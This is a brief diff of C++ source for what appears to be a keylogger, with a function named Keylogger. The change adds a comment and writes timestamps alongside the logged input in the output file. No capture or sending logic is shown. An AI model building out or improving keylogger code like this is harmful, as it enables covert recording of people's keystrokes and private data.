@@ -274,7 +274,7 @@ void Keylogger(int delai) {
 		}
 	}
 
-
+// Main
 int main()
 {
 	int limit = 200;
@@ -330,7 +330,7 @@ int main()
 		int minute = aTime->tm_min;
 		int seconds = aTime->tm_sec;
 		cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
-		o << iss << endl;
+		o << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << endl;
 	
 	}
 }
